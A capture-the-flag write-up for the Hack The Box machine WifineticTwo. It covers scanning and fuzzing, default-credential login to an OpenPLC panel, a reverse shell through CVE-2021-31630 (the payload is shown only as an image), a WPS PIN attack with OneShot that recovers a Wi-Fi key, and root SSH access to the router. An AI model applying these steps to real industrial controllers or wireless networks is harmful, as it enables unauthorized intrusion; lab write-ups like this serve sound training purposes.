![WifineticTwo](https://github.com/amalcew/htb-writeups/assets/73908014/c22abb67-1d9f-4664-8382-db4c2918cd99)

## Reconnaissance & port scanning

Starting with the enumeration:

```bash
> nmap 10.10.11.7 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 15:13 CEST
Nmap scan report for 10.10.11.7 (10.10.11.7)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

The target is hosting a website on port 8080, so let's fuzz the directories:

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.7:8080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.7:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 4550, Words: 1574, Lines: 138, Duration: 143ms]
users                   [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 115ms]
hardware                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 120ms]
programs                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 123ms]
logout                  [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 134ms]
settings                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 143ms]
dashboard               [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 104ms]
monitoring              [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 74ms]
                        [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 227ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

The host contain some valuable endpoints, which will prove useful.

The webpage greets us with login prompt:

![01-initial_page](https://github.com/amalcew/htb-writeups/assets/73908014/53fd1654-21c5-431d-ba3c-62f62c273558)

## Initial foothold

### Default credentials

Inspection of the page did not returned any clues, so before starting bruteforcing the credentials it is always important to check the documentation for any default credentials.

![Untitled](https://github.com/amalcew/htb-writeups/assets/73908014/d6db6aec-59a5-4824-9c6e-0d06e5ea21e8)

Apparently, this was sufficient to gain access to the panel:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/e7f2c6b9-77c2-403b-8cd8-54a35f769633)

### Command injection

As box exploration followed, I've discovered that the target might be vulnerable to [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630), which means that it should be possible to gain reverse shell to the target.

There are many POCs and exploits on the internet, but attempts to execute them were unsuccessful. To leverage this vulnerability, the manual exploitation is required:

After logging to the panel, paste the payload inside hardware tab:

![02-hardware](https://github.com/amalcew/htb-writeups/assets/73908014/071d38bf-6fdf-40cf-b040-7b15cf826e3a)

Now the code need to be compiled:

![03-compilation](https://github.com/amalcew/htb-writeups/assets/73908014/797930c8-46b8-4dbb-889d-69a5a35446a4)

To execute the  reverse shell, we need to start the PLC:

![04-start_plc](https://github.com/amalcew/htb-writeups/assets/73908014/4a4d58ff-0245-427f-a6a1-f187cbf75a54)

The remote code execution is achieved:

```bash
> nc -lnvp 1234  
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.7] 38300
bash: cannot set terminal process group (171): Inappropriate ioctl for device
bash: no job control in this shell
root@attica02:/opt/PLC/OpenPLC_v3/webserver# whoami
whoami
root
root@attica02:/opt/PLC/OpenPLC_v3/webserver# cat /root/user.txt
cat /root/user.txt
c9ae************************b381
```

## Privileges escalation

As we are already logged as root, the probable root flag may be stored on different machine. Further enumeration of the box revealed, that target has wireless interface:

```bash
root@attica02:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if19: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:fb:30:c8 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.3/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.0.3.44/24 metric 100 brd 10.0.3.255 scope global secondary dynamic eth0
       valid_lft 2745sec preferred_lft 2745sec
    inet6 fe80::216:3eff:fefb:30c8/64 scope link 
       valid_lft forever preferred_lft forever
6: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
```

and available wireless network:

```bash
root@attica02:~# iw dev wlan0 scan
iw dev wlan0 scan
BSS 02:00:00:00:01:00(on wlan0)
        last seen: 36927.800s [boottime]
        TSF: 1719238565617112 usec (19898d, 14:16:05)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: plcrouter
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 1
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * SSID List
                 * Operating Mode Notification
        WPS:     * Version: 1.0
                 * Wi-Fi Protected Setup State: 2 (Configured)
                 * Response Type: 3 (AP)
                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
                 * Manufacturer:  
                 * Model:  
                 * Model Number:  
                 * Serial Number:  
                 * Primary Device Type: 0-00000000-0
                 * Device name:  
                 * Config methods: Label, Display, Keypad
                 * Version2: 2.0
```

To exploit the WPS, we can utilize [OneShot](https://github.com/kimocoder/OneShot) tool:

```bash
root@attica02:~# python3 oneshot.py -i wlan0 -K
python3 oneshot.py -i wlan0 -K
[*] Running wpa_supplicant…
[*] BSSID not specified (--bssid) — scanning for available networks
Networks list:
#    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
1)   02:00:00:00:01:00  plcrouter                 WPA2     -30                                 
Select target (press Enter to refresh): 1
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[P] E-Nonce: ************
[*] Sending WPS Message M2…
[P] PKR: ************
[P] PKE: ************
[P] AuthKey: ************
[*] Received WPS Message M3
[P] E-Hash1: ************
[P] E-Hash2: ************
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoW************23!'
[+] AP SSID: 'plcrouter'

```

The tool was able to retrieve PSK for network `plcrouter`. To connect to the network, we can use Unix tool `wpa_supplicant`:

```bash
root@attica02:~# wpa_passphrase plcrouter 'NoW************23!' > key
root@attica02:~# wpa_supplicant -B -c key -i wlan0
root@attica02:~# ifconfig wlan0 192.168.1.5 netmask 255.255.255.0
```

with assigned IP address, we can try to log into the router:

```bash
root@attica02:~# ssh root@192.168.1.1


BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@ap:~# ls
root.txt
root@ap:~# cat root.txt 
e85c************************8e85
```
